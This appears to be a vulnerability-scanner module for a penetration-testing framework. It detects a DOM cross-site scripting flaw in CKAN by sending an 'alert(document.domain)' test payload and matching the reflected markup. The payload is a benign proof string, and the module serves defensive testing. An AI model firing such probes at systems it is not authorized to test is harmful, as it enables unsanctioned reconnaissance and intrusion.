#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CKAN contains a cross-site scripting vulnerability in the document object model via the previous version of th."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CKAN - DOM Cross-Site Scripting Detection',
        'description': 'CKAN contains a cross-site scripting vulnerability in the document object model via the previous version of the jQuery Sparkle library. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'dom', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/ckan/ckan/blob/b9e45e2723d4abd70fa72b16ec4a0bebc795c56b/ckan/public/base/javascript/view-filters.js#L27',
            'https://security.snyk.io/vuln/SNYK-PYTHON-CKAN-42010',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/?{alert(document.domain)}', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<option value="/en/?{alert(document.domain)}" selected="selected">', 'ckan 2.3', 'ckan 2.8.2',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="CKAN - DOM Cross-Site Scripting detected",
                path='/?{alert(document.domain)}',
            )
            return True
        return False

